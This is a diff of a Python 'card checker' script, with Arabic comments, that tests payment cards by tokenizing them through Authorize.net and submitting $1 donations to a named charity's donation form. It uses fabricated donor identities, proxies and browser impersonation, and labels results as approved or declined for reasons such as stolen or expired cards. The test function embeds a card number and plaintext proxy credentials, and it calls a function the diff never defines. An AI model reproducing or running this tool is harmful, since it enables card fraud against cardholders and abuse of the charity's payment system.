@@ -16,8 +16,22 @@ class tools:
         yy = parts[2].strip() if len(parts) > 2 else ""
         cvv = parts[3].strip() if len(parts) > 3 else ""
         
-        # عدم تعديل السنة أو الشهر للحفاظ على التطابق التام مع نسخة requests
+        mm = mm.zfill(2)
+        
+        if len(yy) == 4:
+            yy = yy[-2:]
+        elif len(yy) == 2:
+            yy = yy
+            
         return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+
+
+    @staticmethod
+    def find_between(s: str, first: str, last: str) -> str | None:
+        try:
+            return s.split(first, 1)[1].split(last, 1)[0]
+        except (IndexError, AttributeError):
+            return None
 
     @staticmethod
     def userdata() -> dict:
@@ -35,156 +49,93 @@ class tools:
             "phone": fake.phone_number(),
         }
 
-class Gateway:
     @staticmethod
-    def parse_status(text: str) -> str:
-        """منطق تقييم الحالة المطابق تماماً لنسخة requests"""
-        status = "UNKNOWN_ERROR"
+    def get_card_type(cc_first: str) -> str:
+        if not cc_first:
+            return "visa"
+        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")
 
-        # ═══ Approved / Charged ═══
-        if '"responseCode":"1"' in text or '"resultCode":"Ok"' in text and '"responseCode":"1"' in text:
-            status = "Charged - Approved !"
+RESPONSE_MAP = {
+    '"responseCode":"1"': ("Success", "Charged - Approved ✅", True),
+    '"resultCode":"Ok"': ("Success", "Charged - Approved ✅", True),
+    "insufficient fund": ("Declined", "Insufficient Funds ❌", False),
+    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
+    "credit limit": ("Declined", "Credit Limit Exceeded ❌", False),
+    "exceeds balance": ("Declined", "Exceeds Balance ❌", False),
+    "over credit limit": ("Declined", "Over Credit Limit ❌", False),
+    "exceeds withdrawal": ("Declined", "Exceeds Withdrawal ❌", False),
+    "expired": ("Declined", "Expired Card ❌", False),
+    "expired_card": ("Declined", "Expired Card ❌", False),
+    '"errorCode":"8"': ("Declined", "Expired Card ❌", False),
+    '"errorCode":"6"': ("Declined", "Invalid Card Number ❌", False),
+    "card number is invalid": ("Declined", "Invalid Card Number ❌", False),
+    "invalid_card": ("Declined", "Invalid Card Number ❌", False),
+    '"errorCode":"7"': ("Declined", "Invalid Expiration Date ❌", False),
+    "expiration date is invalid": ("Declined", "Invalid Expiration Date ❌", False),
+    "invalid_or_restricted_card": ("Declined", "Invalid Or Restricted Card ❌", False),
+    "lost_or_stolen": ("Declined", "Lost Or Stolen ❌", False),
+    '"errorCode":"4"': ("Declined", "Lost Or Stolen ❌", False),
+    "pick up card": ("Declined", "Lost Or Stolen ❌", False),
+    "pickup_card_special_conditions": ("Declined", "Pickup Card Special Conditions ❌", False),
+    "cvv2_failure": ("Declined", "CVV2 Failure ❌", False),
+    '"errorCode":"65"': ("Declined", "CVV2 Failure ❌", False),
+    '"errorCode":"78"': ("Declined", "CVV2 Failure ❌", False),
+    "avs mismatch": ("Declined", "AVS Mismatch ❌", False),
+    '"errorCode":"27"': ("Declined", "AVS Mismatch ❌", False),
+    '"errorCode":"127"': ("Declined", "AVS Mismatch ❌", False),
+    '"errorCode":"45"': ("Declined", "AVS + CVV Mismatch ❌", False),
+    "the transaction for donation": ("Declined", "Declined ❌", False),
+    "was declined": ("Declined", "Declined ❌", False),
+    "transaction failed": ("Declined", "Failed ❌", False),
+    "suspected_fraud": ("Declined", "Suspected Fraud ❌", False),
+    "fraud": ("Declined", "Suspected Fraud ❌", False),
+    "security_violation": ("Declined", "Security Violation ❌", False),
+    "compliance_violation": ("Declined", "Compliance Violation ❌", False),
+    '"errorCode":"250"': ("Declined", "Blocked IP (FDS) ❌", False),
+    '"errorCode":"251"': ("Declined", "Fraud Filter Decline ❌", False),
+    "cryptographic_failure": ("Declined", "Cryptographic Failure ❌", False),
+    "do_not_honor": ("Declined", "Do Not Honor ❌", False),
+    '"errorCode":"2"': ("Declined", "Do Not Honor ❌", False),
+    "account_closed": ("Declined", "Account Closed ❌", False),
+    "payer_account_locked_or_closed": ("Declined", "Payer Account Locked Or Closed ❌", False),
+    "account_blocked_by_issuer": ("Declined", "Account Blocked By Issuer ❌", False),
+    "invalid_account": ("Declined", "Invalid Account ❌", False),
+    "restricted_or_inactive_account": ("Declined", "Restricted Or Inactive Account ❌", False),
+    "declined_due_to_updated_account": ("Declined", "Declined Due To Updated Account ❌", False),
+    "generic_decline": ("Declined", "Generic Decline ❌", False),
+    "order_not_approved": ("Declined", "Order Not Approved ❌", False),
+    "transaction_not_permitted": ("Declined", "Transaction Not Permitted ❌", False),
+    "invalid_transaction": ("Declined", "Invalid Transaction ❌", False),
+    "payment_denied": ("Declined", "Payment Denied ❌", False),
+    "payer_cannot_pay": ("Declined", "Payer Cannot Pay ❌", False),
+    "reattempt_not_permitted": ("Declined", "Reattempt Not Permitted ❌", False),
+    "tx_attempts_exceed_limit": ("Declined", "TX Attempts Exceed Limit ❌", False),
+    "transaction_cannot_be_completed": ("Declined", "Transaction Cannot Be Completed ❌", False),
+    "declined_please_retry": ("Declined", "Declined Please Retry ❌", False),
+    "duplicate": ("Declined", "Duplicate Transaction ❌", False),
+    '"errorCode":"11"': ("Declined", "Duplicate Transaction ❌", False),
+    '"errorCode":"13"': ("Declined", "Merchant Account Error ❌", False),
+    '"errorCode":"17"': ("Declined", "Card Type Not Accepted ❌", False),
+    '"errorCode":"3"': ("Declined", "Voice Auth Required ❌", False),
+    '"responseCode":"2"': ("Declined", "Declined ❌", False),
+    '"responseCode":"3"': ("Declined", "Processing Error ❌", False),
+    '"responseCode":"4"': ("Declined", "Held For Review ❌", False),
+    '"E00005"': ("Declined", "API Authentication Error ❌", False),
+    '"E00006"': ("Declined", "API Authentication Error ❌", False),
+    '"E00007"': ("Declined", "API Authentication Error ❌", False),
+    '"E00008"': ("Declined", "API Permission Error ❌", False),
+    '"E00009"': ("Declined", "API Permission Error ❌", False),
+    '"E00010"': ("Declined", "API Permission Error ❌", False),
+    '"E00011"': ("Declined", "API Permission Error ❌", False),
+}
 
-        # ═══ Insufficient Funds / Balance ═══
-        elif 'insufficient fund' in text.lower() or 'INSUFFICIENT_FUNDS' in text:
-            status = "Insufficient Funds"
-        elif 'credit limit' in text.lower() or 'exceeds balance' in text.lower():
-            status = "Credit Limit Exceeded"
-        elif 'over credit limit' in text.lower() or 'exceeds withdrawal' in text.lower():
-            status = "Over Credit Limit"
-
-        # ═══ Card Issues ═══
-        elif 'expired' in text.lower() or 'EXPIRED_CARD' in text or '"errorCode":"8"' in text:
-            status = "Expired Card"
-        elif '"errorCode":"6"' in text or 'card number is invalid' in text.lower() or 'INVALID_CARD' in text:
-            status = "Invalid Card Number"
-        elif '"errorCode":"7"' in text or 'expiration date is invalid' in text.lower():
-            status = "Invalid Expiration Date"
-        elif 'INVALID_OR_RESTRICTED_CARD' in text:
-            status = "Invalid Or Restricted Card"
-        elif 'LOST_OR_STOLEN' in text or '"errorCode":"4"' in text or 'pick up card' in text.lower():
-            status = "Lost Or Stolen"
-        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
-            status = "Pickup Card Special Conditions"
-
-        # ═══ Verification Failures ═══
-        elif 'CVV2_FAILURE' in text or '"errorCode":"65"' in text or '"errorCode":"78"' in text:
-            status = "CVV2 Failure"
-        elif 'AVS mismatch' in text or '"errorCode":"27"' in text or '"errorCode":"127"' in text:
-            status = "AVS Mismatch"
-        elif '"errorCode":"45"' in text:
-            status = "AVS + CVV Mismatch"
-
-        # ═══ Security / Fraud ═══
-        elif 'The transaction for donation' in text and 'was declined' in text:
-            status = "Declined"
-        elif 'Transaction Failed' in text:
-            status = "Failed"
-        elif 'SUSPECTED_FRAUD' in text or 'fraud' in text.lower():
-            status = "Suspected Fraud"
-        elif 'SECURITY_VIOLATION' in text:
-            status = "Security Violation"
-        elif 'COMPLIANCE_VIOLATION' in text:
-            status = "Compliance Violation"
-        elif '"errorCode":"250"' in text:
-            status = "Blocked IP (FDS)"
-        elif '"errorCode":"251"' in text:
-            status = "Fraud Filter Decline"
-        elif 'CRYPTOGRAPHIC_FAILURE' in text:
-            status = "Cryptographic Failure"
-
-        # ═══ Account Issues ═══
-        elif 'DO_NOT_HONOR' in text or '"errorCode":"2"' in text and '"responseCode":"2"' in text:
-            status = "Do Not Honor"
-        elif 'ACCOUNT_CLOSED' in text:
-            status = "Account Closed"
-        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
-            status = "Payer Account Locked Or Closed"
-        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
-            status = "Account Blocked By Issuer"
-        elif 'INVALID_ACCOUNT' in text:
-            status = "Invalid Account"
-        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
-            status = "Restricted Or Inactive Account"
-        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
-            status = "Declined Due To Updated Account"
-
-        # ═══ Transaction Issues ═══
-        elif 'GENERIC_DECLINE' in text:
-            status = "Generic Decline"
-        elif 'ORDER_NOT_APPROVED' in text:
-            status = "Order Not Approved"
-        elif 'TRANSACTION_NOT_PERMITTED' in text:
-            status = "Transaction Not Permitted"
-        elif 'INVALID_TRANSACTION' in text:
-            status = "Invalid Transaction"
-        elif 'PAYMENT_DENIED' in text:
-            status = "Payment Denied"
-        elif 'PAYER_CANNOT_PAY' in text:
-            status = "Payer Cannot Pay"
-        elif 'REATTEMPT_NOT_PERMITTED' in text:
-            status = "Reattempt Not Permitted"
-        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
-            status = "TX Attempts Exceed Limit"
-        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
-            status = "Transaction Cannot Be Completed"
-        elif 'DECLINED_PLEASE_RETRY' in text:
-            status = "Declined Please Retry"
-        elif 'duplicate' in text.lower() or '"errorCode":"11"' in text:
-            status = "Duplicate Transaction"
-
-        # ═══ Merchant / Processor Errors ═══
-        elif '"errorCode":"13"' in text or 'merchant' in text.lower() and 'invalid' in text.lower():
-            status = "Merchant Account Error"
-        elif '"errorCode":"17"' in text or 'card type' in text.lower() and 'not accepted' in text.lower():
-            status = "Card Type Not Accepted"
-        elif '"errorCode":"3"' in text and '"responseCode":"2"' in text:
-            status = "Voice Auth Required"
-
-        # ═══ Held for Review ═══
-        elif '"responseCode":"4"' in text:
-            status = "Held For Review"
-
-        # ═══ API / Auth Errors ═══
-        elif '"E00005"' in text or '"E00006"' in text or '"E00007"' in text:
-            status = "API Authentication Error"
-        elif '"E00008"' in text or '"E00009"' in text or '"E00010"' in text or '"E00011"' in text:
-            status = "API Permission Error"
-
-        # ═══ General Decline ═══
-        elif '"responseCode":"2"' in text:
-            status = "Declined"
-        elif '"responseCode":"3"' in text:
-            status = "Processing Error"
-
-        # ═══ Fallback ═══
-        else:
-            try:
-                error_data = json.loads(text)
-                if 'transactionResponse' in error_data:
-                    tx = error_data['transactionResponse']
-                    if 'errors' in tx:
-                        errs = tx['errors']
-                        if isinstance(errs, dict) and 'error' in errs:
-                            status = errs['error'][0].get('errorText', 'UNKNOWN_ERROR')
-                        elif isinstance(errs, list):
-                            status = errs[0].get('errorText', 'UNKNOWN_ERROR')
-                    elif 'messages' in tx:
-                        msgs = tx['messages']
-                        if isinstance(msgs, dict) and 'message' in msgs:
-                            status = msgs['message'][0].get('description', 'UNKNOWN_ERROR')
-                elif 'data' in error_data:
-                    status = error_data['data'].get('error', 'UNKNOWN_ERROR')
-            except:
-                status = "UNKNOWN_ERROR"
-
-        return status
-
+class Gateway:
     @staticmethod
     async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
         token = str(uuid.uuid4())
+        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
 
-        async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
+        async with AsyncSession(impersonate="chrome127", proxies=proxies) as session:
             try:
                 # Step 1: GET donation form page to extract parameters
                 headers_init = {
@@ -201,30 +152,22 @@ class Gateway:
                     headers=headers_init,
                 )
                 html = resp_init.text
-
-                # استخدام Regex المطابق تماماً لملف requests
-                donate_url_match = re.search(r'"donateUrl":\s*"([^"]+)"', html)
-                if not donate_url_match:
+                donate_url = tools.find_between(html, '"donateUrl":"', '"')
+                if not donate_url:
                     return "Error", "donateUrl not found", False
-                donate_url = donate_url_match.group(1)
-
-                clientPublicKey_match = re.search(r'"clientPublicKey":\s*"([^"]+)"', html)
-                if not clientPublicKey_match:
+                clientPublicKey = tools.find_between(html, '"clientPublicKey":"', '"')
+                if not clientPublicKey:
                     return "Error", "clientPublicKey not found", False
-                clientPublicKey = clientPublicKey_match.group(1)
-
-                apiLoginId_match = re.search(r'"apiLoginId":\s*"([^"]+)"', html)
-                if not apiLoginId_match:
+                apiLoginId = tools.find_between(html, '"apiLoginId":"', '"')
+                if not apiLoginId:
                     return "Error", "apiLoginId not found", False
-                apiLoginId = apiLoginId_match.group(1)
 
                 parsed_url = urlparse(donate_url)
                 qs = parse_qs(parsed_url.query)
                 route_sig = qs.get('givewp-route-signature', [None])[0]
                 route_id = qs.get('givewp-route-signature-id', [None])[0]
                 route_exp = qs.get('givewp-route-signature-expiration', [None])[0]
-
-                if not route_sig or not route_exp:
+                if not route_sig or not route_id or not route_exp:
                     return "Error", "Missing route signature parameters", False
 
                 # Step 2: Tokenize card via Authorize.net
@@ -233,10 +176,6 @@ class Gateway:
                     "referer": "https://www.ohelfamily.org/?givewp-route=donation-form-view&form-id=794&locale=en_US",
                     "content-type": "application/json; charset=UTF-8",
                 }
-                
-                # استخدام mk مباشرة كما هو في ملف requests
-                mk = f"{card_data['mm']} {card_data['yy']}"
-                
                 json_auth = {
                     "securePaymentContainerRequest": {
                         "merchantAuthentication": {
@@ -248,7 +187,7 @@ class Gateway:
                             "id": token,
                             "token": {
                                 "cardNumber": card_data["cc"],
-                                "expirationDate": mk,
+                                "expirationDate": f"{card_data['mm']} {card_data['yy']}",
                                 "cardCode": card_data["cvv"],
                             },
                         },
@@ -260,17 +199,12 @@ class Gateway:
                     json=json_auth,
                 )
                 auth_text = resp_auth.text
-
-                data_value_match = re.search(r'"dataValue":"(.*?)"', auth_text)
-                data_descriptor_match = re.search(r'"dataDescriptor":"(.*?)"', auth_text)
-
-                if not data_value_match or not data_descriptor_match:
+                data_value = tools.find_between(auth_text, '"dataValue":"', '"')
+                data_descriptor = tools.find_between(auth_text, '"dataDescriptor":"', '"')
+                if not data_value or not data_descriptor:
                     return "Error", "Failed to extract dataValue or dataDescriptor", False
 
-                data_value = data_value_match.group(1)
-                data_descriptor = data_descriptor_match.group(1)
-
-                # Step 3: Submit donation form (استخدام files لإرسال multipart/form-data المطابق تماماً لـ requests)
+                # Step 3: Submit donation form (application/x-www-form-urlencoded)
                 headers_donate = {
                     "origin": "https://www.ohelfamily.org",
                     "referer": "https://www.ohelfamily.org/?givewp-route=donation-form-view&form-id=794&locale=en_US",
@@ -281,56 +215,85 @@ class Gateway:
                     "givewp-route-signature-id": "givewp-donate",
                     "givewp-route-signature-expiration": route_exp,
                 }
-                
-                files_donate = {
-                    'amount': (None, '1'),
-                    'currency': (None, 'USD'),
-                    'donationType': (None, 'single'),
-                    'subscriptionPeriod': (None, 'one-time'),
-                    'subscriptionFrequency': (None, '1'),
-                    'subscriptionInstallments': (None, '0'),
-                    'formId': (None, '794'),
-                    'p2pSourceID': (None, '0'),
-                    'enableTribute': (None, 'hide'),
-                    'tributeType': (None, 'In honor of'),
-                    'tributesSendNotification': (None, 'send'),
-                    'gatewayId': (None, 'authorize'),
-                    'feeRecovery': (None, '0'),
-                    'p2pSourceType': (None, ''),
-                    'honorific': (None, 'Mr.'),
-                    'firstName': (None, user_data["first"]),
-                    'lastName': (None, user_data["last"]),
-                    'email': (None, user_data["email"]),
-                    'phone': (None, user_data["phone"]),
-                    'constantcontact': (None, 'true'),
-                    'country': (None, 'US'),
-                    'address1': (None, user_data["address"]),
-                    'address2': (None, ''),
-                    'city': (None, user_data["city"]),
-                    'state': (None, user_data["state"]),
-                    'zip': (None, user_data["zip"]),
-                    'comment': (None, ''),
-                    'dtd': (None, 'undefined'),
-                    'feeRecoveryConfirmation': (None, ''),
-                    'donationBirthday': (None, ''),
-                    'originUrl': (None, 'https://www.ohelfamily.org/donate/'),
-                    'isEmbed': (None, 'true'),
-                    'embedId': (None, 'give-form-shortcode-2'),
-                    'locale': (None, 'en_US'),
-                    'gatewayData[give_authorize_data_descriptor]': (None, data_descriptor),
-                    'gatewayData[give_authorize_data_value]': (None, data_value),
+                data_donate = {
+                    "amount": "1",
+                    "currency": "USD",
+                    "donationType": "single",
+                    "subscriptionPeriod": "one-time",
+                    "subscriptionFrequency": "1",
+                    "subscriptionInstallments": "0",
+                    "formId": "794",
+                    "p2pSourceID": "0",
+                    "enableTribute": "hide",
+                    "tributeType": "In honor of",
+                    "tributesSendNotification": "send",
+                    "gatewayId": "authorize",
+                    "feeRecovery": "0",
+                    "p2pSourceType": "",
+                    "honorific": "Mr.",
+                    "firstName": user_data["first"],
+                    "lastName": user_data["last"],
+                    "email": user_data["email"],
+                    "phone": user_data["phone"],
+                    "constantcontact": "true",
+                    "country": "US",
+                    "address1": user_data["address"],
+                    "address2": "",
+                    "city": user_data["city"],
+                    "state": user_data["state"],
+                    "zip": user_data["zip"],
+                    "comment": "",
+                    "dtd": "undefined",
+                    "feeRecoveryConfirmation": "",
+                    "donationBirthday": "",
+                    "originUrl": "https://www.ohelfamily.org/donate/",
+                    "isEmbed": "true",
+                    "embedId": "give-form-shortcode-2",
+                    "locale": "en_US",
+                    "gatewayData[give_authorize_data_descriptor]": data_descriptor,
+                    "gatewayData[give_authorize_data_value]": data_value,
                 }
-
                 resp_donate = await session.post(
                     "https://www.ohelfamily.org/",
                     params=params_donate,
                     headers=headers_donate,
-                    files=files_donate,
+                    data=data_donate,
                 )
+                response_text = resp_donate.text.lower()
 
-                status = Gateway.parse_status(resp_donate.text)
-                is_live = status == "Charged - Approved !"
-                return status, resp_donate.text, is_live
+                # Step 4: Classify using RESPONSE_MAP
+                for key, (status, msg, is_live) in RESPONSE_MAP.items():
+                    if key in response_text:
+                        return status, msg, is_live
+
+                # Fallback: try to parse JSON for deeper error messages
+                try:
+                    error_data = resp_donate.json()
+                    if 'transactionResponse' in error_data:
+                        tx = error_data['transactionResponse']
+                        if 'errors' in tx:
+                            errs = tx['errors']
+                            if isinstance(errs, dict) and 'error' in errs:
+                                err_text = errs['error'][0].get('errorText', '')
+                            elif isinstance(errs, list):
+                                err_text = errs[0].get('errorText', '')
+                            else:
+                                err_text = str(errs)
+                            if err_text:
+                                return "Declined", f"{err_text} ❌", False
+                        elif 'messages' in tx:
+                            msgs = tx['messages']
+                            if isinstance(msgs, dict) and 'message' in msgs:
+                                err_text = msgs['message'][0].get('description', '')
+                                if err_text:
+                                    return "Declined", f"{err_text} ❌", False
+                    elif 'data' in error_data and 'error' in error_data['data']:
+                        err_text = error_data['data']['error']
+                        return "Declined", f"{err_text} ❌", False
+                except:
+                    pass
+
+                return "Unknown", "Unrecognised response ❓", False
 
             except Exception as e:
                 return "Error", f"Exception: {str(e)}", False
@@ -349,29 +312,24 @@ async def process_Au_1(card_line: str, proxy_url: str = None) -> tuple[str, str,
         user_data=user_data,
         proxies=proxies,
     )
-
-
-# ═══ دالة الاختبار الشاملة ═══
+    
 async def main():
-    import asyncio
+    # بطاقة اختبار قياسية لـ Stripe
+    test_card = "4211566115568609|12|28|321"
     
-    test_card = "4000000000000002|12|2028|123"
-    print(f"--- بدء تشغيل الاختبار على البطاقة: {test_card} ---")
+    # البروكسي الخاص بك بالصيغة الصحيحة
+    proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"
+
+    print("🚀 جاري اختبار البوابة (ST Charge)...")
+    print(f"💳 البطاقة: {test_card}")
+    print(f"🌐 جاري الاتصال عبر: {proxy}")
     
-    card_data = tools.getcard(test_card)
-    print(f"[1] استخراج بيانات البطاقة: {card_data}")
+    status, message, is_live = await process_SQ_1_charge(test_card, proxy_url=proxy)
     
-    user_data = tools.userdata()
-    print(f"[2] توليد بيانات المستخدم: {user_data['name']} - {user_data['email']}")
-    
-    print("[3] جاري إرسال الطلبات عبر curl-cffi...")
-    status, response_text, is_live = await process_Au_1(test_card)
-    
-    print("--- نتائج التنفيذ ---")
-    print(f"الحالة المحددة (Status): {status}")
-    print(f"هل البطاقة مقبولة (Is Live): {is_live}")
-    print(f"جزء من الرد النهائي: {response_text[:300]}...")
+    print("\n--- نتيجة التنفيذ ---")
+    print(f"الحالة  : {status}")
+    print(f"الرسالة : {message}")
+    print(f"مقبولة  : {is_live}")
 
 if __name__ == "__main__":
-    import asyncio
     asyncio.run(main())
